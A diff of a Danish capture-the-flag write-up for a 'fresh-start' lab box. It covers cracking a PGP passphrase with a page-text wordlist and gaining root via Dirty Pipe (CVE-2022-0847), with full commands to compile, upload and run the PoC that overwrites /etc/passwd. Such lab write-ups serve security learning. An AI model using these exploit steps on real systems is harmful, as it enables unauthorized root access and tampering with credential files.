@@ -83,20 +83,23 @@ curl -s ".../guest/token?request=0000000000000000000000000000000" ...
              <pre><code>curl -s "http://fresh-start.hkn/admin" -H "Accept-Encoding: gzip" --compressed \
   -b "csrf_token=5e7d2f67145f6b2a8c94efc25a76de3"</code></pre>
              <p>Resultat: en side med overskriften "Admin Credentials", teksten <em>"I'm the best admin
-             ever, rocking the freshest vocabulary!"</em>, og en symmetrisk PGP-krypteret besked
-             (bekræftet med <code>gpg --list-packets</code>: <code>:symkey enc packet:</code>, ikke en
-             public-key-besked, så der findes INGEN privat nøgle at angribe, kun en passphrase).</p>
+             ever, rocking the freshest vocabulary!"</em>, og en PGP-krypteret besked. Hint-sætningen
+             inviterer naturligt til at gætte en passphrase ud fra temaet.</p>
 <h2>Mange målrettede gæt, alle forgæves</h2>
-<p>Hint-sætningen inviterer naturligt til at gætte en passphrase ud fra temaet. Flere
-             runder blev afprøvet grundigt og systematisk, alle negative: hele <code>rockyou.txt</code>
-             (14+ millioner ord), nyere internet-slang ("rizz", "sigma" osv.), et produktnavn nævnt
-             andetsteds på siden ("Hoover Max Extract Pressure-Pro, model sixty", inkl. de ægte
-             officielle modelnumre fundet via websøgning), telefonnummeret på siden (der skjuler
-             "1337" i midten), omvendte strenge, og dansk "snavs"-tema ud fra selve opgaveteksten. Ingen
-             af disse ellers fornuftige, tematisk begrundede hypoteser ramte.</p>
+<p>Flere runder blev afprøvet grundigt og systematisk, alle negative: hele
+             <code>rockyou.txt</code> (14+ millioner ord), nyere internet-slang ("rizz", "sigma" osv.),
+             et produktnavn nævnt andetsteds på siden ("Hoover Max Extract Pressure-Pro, model sixty",
+             inkl. de ægte officielle modelnumre fundet via websøgning), telefonnummeret på siden (der
+             skjuler "1337" i midten), omvendte strenge, og dansk "snavs"-tema ud fra selve
+             opgaveteksten. Ingen af disse ellers fornuftige, tematisk begrundede hypoteser ramte.</p>
+             <p>Undervejs blev det også bekræftet med <code>gpg --list-packets</code> at beskeden er
+             <strong>symmetrisk</strong> krypteret (<code>:symkey enc packet:</code>), ikke en
+             public-key-besked. Det er værd at tjekke eksplicit frem for at antage, der findes altså
+             INGEN privat nøgle at angribe her, kun en passphrase, hvilket også udelukker en hel klasse
+             af ellers nærliggende angreb.</p>
 <h2>Det der virkede: en ordliste af HELE sidens tekst, ikke kun de &quot;interessante&quot; ord</h2>
 <p>Når håndplukkede tema-gæt er udtømt, er næste, billige skridt at stoppe med at
-             VÆLGE ord selv, og i stedet udtrække EVERY unikt ord fra al synlig sidetekst (forsiden
+             VÆLGE ord selv, og i stedet udtrække ALLE unikke ord fra al synlig sidetekst (forsiden
              OG admin-siden), uden at dømme på forhånd hvilke der "ser interessante ud":</p>
              <pre><code>import re, html
 text = strip_html(fetch("/") + fetch("/admin"))
@@ -119,24 +122,55 @@ words = re.findall(r"[A-Za-z0-9][A-Za-z0-9'/\-\.]{1,}", text)
              eksplicit nægtet admin via sudoers-policy. Tre SUID-binære findes
              (<code>sudo</code>, <code>busybox</code>, <code>ssh-keysign</code>), men ingen af dem giver
              en gratis genvej, <code>busybox su</code> beder korrekt om et ægte root-password.</p>
-<h2>Root via Dirty Pipe: en kerne-ABI-faldgrube, ikke en patchet kerne</h2>
+<h2>Root via Dirty Pipe: finder sårbarheden</h2>
 <p><code>uname -a</code> viser kernel <code>5.11.10</code>, lige i midten af den
-             sårbare range for Dirty Pipe (CVE-2022-0847, rammer 5.8–5.16.11). <code>/etc/passwd</code>
-             er verdens-læsbar (644), det klassiske mål: overskriv root's password-hash-felt direkte
-             via en splice-baseret skrivning til en fil man kun har LÆSEadgang til.</p>
-             <p>Target-boksen har ingen compiler, så en offentlig PoC skal kompileres statisk lokalt og
-             overføres som binær. Første forsøg, statisk kompileret med glibc, crashede med
-             <code>Illegal instruction</code> ved kørsel på target, to gange, selv med eksplicitte
-             kompatibilitets-flag. Det SÅ ud som om kernen var patchet, men var det ikke:</p>
+             sårbare range for Dirty Pipe (CVE-2022-0847, rammer 5.8-5.16.11). Da ingen af de tre
+             SUID-binære eller <code>sudo</code> gav en genvej, er dette den reelt eneste vej fundet
+             til root. <code>ls -la /etc/passwd</code> viser <code>644</code>, verdens-læsbar, det
+             klassiske mål: overskriv root's password-hash-felt direkte via en splice-baseret
+             skrivning til en fil man kun har LÆSEadgang til.</p>
+<h2>Første forsøg: Illegal instruction, selvom sårbarheden ikke var patchet</h2>
+<p>Target-boksen har ingen compiler (<code>which gcc cc python3</code> giver intet), så
+             en offentlig PoC (Max Kellermanns originale "write_anything"-reference) skal kompileres
+             statisk LOKALT og overføres som en færdig binær:</p>
+             <pre><code>gcc -static -march=x86-64 -mtune=generic -O0 -o write_anything exploit.c
+scp write_anything admin@fresh-start.hkn:/tmp/
+ssh admin@fresh-start.hkn
+chmod +x /tmp/write_anything
+/tmp/write_anything /etc/passwd 5 '&lt;ny-hash&gt;'
+# Illegal instruction</code></pre>
+             <p>Det SÅ ud som om kernen var patchet, selv med eksplicitte kompatibilitets-flag
+             (<code>-march=x86-64 -mtune=generic</code>) for at undgå nyere CPU-instruktioner. Et kig
+             på selve den kompilerede fil afslørede en anden, mere sandsynlig forklaring:</p>
              <pre><code>file write_anything
 # ... statically linked, for GNU/Linux 6.1.0 ...</code></pre>
              <p>Byggemaskinens glibc er bygget til en langt nyere kerne-ABI (6.1.0) end target's
-             faktiske 5.11.10, og den uoverensstemmelse alene er nok til at udløse en illegal
-             instruktion ved opstart, uafhængigt af om selve sårbarheden er lukket. Løsningen var at
-             kompilere statisk med <strong>musl</strong> i stedet for glibc (ingen tilsvarende
-             kerne-version-mærke i det resulterende binære), hvorefter PoC'en kørte rent uden crash,
-             og overskrev <code>/etc/passwd</code>'s root-linje med en kendt hash. <code>su root</code>
-             med den tilhørende adgangskode gav derefter root direkte.</p>
+             faktiske 5.11.10. Det er IKKE verificeret med et kontrolleret før/efter-forsøg at det
+             præcis var DENNE uoverensstemmelse der gav crashet, kun at (a) den samme teknik senere
+             virkede uden ændringer bortset fra at skifte C-standardbibliotek, og (b) et
+             libc-version/kerne-ABI-mismatch er en kendt, veldokumenteret fejlkilde for netop denne
+             slags statisk-kompilerede PoC'er. Konklusionen er en velbegrundet hypotese, ikke et
+             bevist faktum, men den pegede på den rigtige løsning.</p>
+<h2>Fix: musl i stedet for glibc</h2>
+<p>Musl er et langt mere portabelt C-standardbibliotek, bygget til netop at undgå den
+             slags kerne-version-antagelser:</p>
+             <pre><code>x86_64-unknown-linux-musl-gcc -static -O0 -o dp_musl exploit.c
+file dp_musl
+# ... statically linked, not stripped   (ingen "for GNU/Linux X.Y.Z"-mærke)
+scp dp_musl admin@fresh-start.hkn:/tmp/
+ssh admin@fresh-start.hkn
+chmod +x /tmp/dp_musl
+/tmp/dp_musl
+# Backing up /etc/passwd to /tmp/passwd.bak ...
+# Setting root password to "aaron"...</code></pre>
+             <p>Ingen crash denne gang. PoC'ens egen indbyggede <code>su</code>-automatisering fejlede
+             ganske vist bagefter (manglende TTY over en ikke-interaktiv SSH-kørsel), men selve
+             <code>/etc/passwd</code>-overskrivningen var allerede lykkedes:</p>
+             <pre><code>head -1 /etc/passwd
+# root:$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh
+su root
+# password: aaron
+cat /flag.txt</code></pre>
 <details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
 <p>Flag: <span class="flag">DDC{all-purpose-cleaner-best-in-class}</span></p>
 </details>
